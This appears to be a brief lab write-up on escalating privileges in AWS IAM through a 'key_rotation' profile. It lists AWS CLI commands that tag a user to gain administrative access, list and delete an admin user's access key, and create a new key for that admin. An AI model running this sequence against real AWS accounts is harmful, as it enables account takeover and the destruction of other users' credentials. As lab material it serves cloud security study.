----------------

### IAM privesc by key_rotation

----------------

- Check policies-:

<img width="1230" height="178" alt="image" src="https://github.com/user-attachments/assets/4592a883-4aaf-4be0-8ff4-a1e98c22fbb5" />

<img width="1294" height="527" alt="image" src="https://github.com/user-attachments/assets/5883fb3b-5691-453e-83aa-6dfc6e6ab92a" />

- If a user can add tags to a user, you can add administrative acccess to a user.e.g

```bash
aws iam tag-user --user-name <username> --tags '{"Key": "developer", "Value": "true"}' --profile key_rotation | jq
```

- Deleting access keys requires `listing the access key id` like this-:

```bash
aws iam list-access-keys --user-name <username> --profile key_rotation | jq
```

<img width="1128" height="366" alt="image" src="https://github.com/user-attachments/assets/3794fdeb-7eb0-4a0e-8944-a0b699e5e917" />

- Finally deleting it-:

```bash
aws iam delete-access-key --user-name admin_ --access-key-id AKIA4TCVBDXKSZGBT75K --profile key_rotation | jq
```
- Creating a new  access-key-:

```bash
aws iam create-access-key --user-name <admin> --profile key_rotation | jq
```

-


-----------------
